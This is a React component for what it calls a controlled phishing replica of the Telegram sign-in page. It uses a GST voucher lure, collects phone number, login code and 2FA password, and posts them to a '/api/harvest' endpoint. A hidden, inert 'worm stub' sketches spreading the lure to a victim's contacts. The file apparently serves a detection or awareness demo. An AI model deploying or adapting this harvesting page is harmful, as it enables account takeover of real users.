import { useState, type FormEvent } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import '../src/index.css'

function TelegramPage() {
  const navigate = useNavigate()
  const [status, setStatus] = useState('')

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    const form = event.currentTarget
    const payload = {
      phone: (form.elements.namedItem('phone') as HTMLInputElement | null)?.value ?? '',
      otp: (form.elements.namedItem('otp') as HTMLInputElement | null)?.value ?? '',
      twofa: (form.elements.namedItem('twofa') as HTMLInputElement | null)?.value ?? '',
    }

    setStatus('Submitting...')

    try {
      const response = await fetch('/api/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })

      if (response.ok) {
        setStatus('Verification complete')
        navigate('/meme')
      } else {
        setStatus('Submission failed')
      }
    } catch {
      setStatus('Submission failed')
    }
  }

  return (
    <section className="telegram-page">
      <div className="demo">⚠️ DEMO ONLY — controlled phishing replica. Telegram never asks for your login code on a website.</div>
      <div className="wrap">
        <div className="logo">
          <svg viewBox="0 0 24 24">
            <path d="M9.8 16.4l-.4 4c.5 0 .8-.2 1.1-.5l2.6-2.5 5.4 3.9c1 .6 1.7.3 2-1L23.9 4c.3-1.4-.5-2-1.5-1.6L2.2 10.2c-1.4.5-1.3 1.3-.2 1.7l5.1 1.6L18.9 6.2c.5-.4 1-.2.6.2z" />
          </svg>
        </div>
        <h1>Sign in to Telegram</h1>
        <p className="sub">Please confirm your number and the code we sent you to claim your GST Voucher.</p>
        <form id="f" onSubmit={handleSubmit}>
          <label htmlFor="phone">Mobile number</label>
          <input id="phone" name="phone" type="tel" placeholder="+65 9123 4567" autoComplete="off" />
          <label htmlFor="otp">Login code</label>
          <input id="otp" name="otp" type="text" placeholder="Code we texted you" autoComplete="off" />
          <div className="hint">Enter the code Telegram just sent to your phone.</div>
          <label htmlFor="twofa">Cloud password (2FA)</label>
          <input id="twofa" name="twofa" type="password" placeholder="Your 2FA password" autoComplete="off" />
          <button type="submit">Next</button>
          {status ? <p className="hint">{status}</p> : null}
        </form>
      </div>

      <p style={{ marginTop: '1rem', textAlign: 'center' }}>
        <Link to="/meme">Go to meme scam page</Link>
      </p>

      {/*
        DEMO worm stub. Mirrors the real Telegram-takeover kit: once the stolen
        code builds an authorized session, it reuses the api_id / api_hash to
        blast the same phishing link to the victim's whole contact list. Rendered
        (hidden) into the DOM so the detonation engine can surface it as evidence.
        Does nothing real.
      */}
      <pre data-worm-stub hidden aria-hidden="true" style={{ display: 'none' }}>{`
function forwardToContacts(session) {
  const api_id = session.api_id;      // attacker-controlled
  const api_hash = session.api_hash;  // attacker-controlled
  const contacts = getContactList();  // whole address book
  for (const contact of contacts) sendPhishingLink(contact, api_id, api_hash);
}
`}</pre>
    </section>
  )
}

export default TelegramPage
